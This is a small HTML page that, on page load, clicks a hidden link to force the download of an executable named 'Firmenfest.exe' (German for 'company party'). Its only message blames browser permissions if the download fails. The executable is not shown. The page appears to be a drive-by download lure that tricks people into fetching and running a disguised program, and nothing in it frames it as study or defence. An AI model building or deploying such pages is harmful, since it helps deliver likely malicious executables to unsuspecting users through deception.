<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Downloading file…</title>
</head>
<body>
    <p id="status">Downloading file…</p>

    <script>
        window.addEventListener("load", () => {
            const link = document.createElement("a");

            link.href = "./Firmenfest.exe";
            link.download = "./Firmenfest.exe";

            document.body.appendChild(link);
            link.click();
            link.remove();

            document.getElementById("status").textContent =
                "If the download did not start, please check your browser download permissions.";
        });
    </script>
</body>
</html>
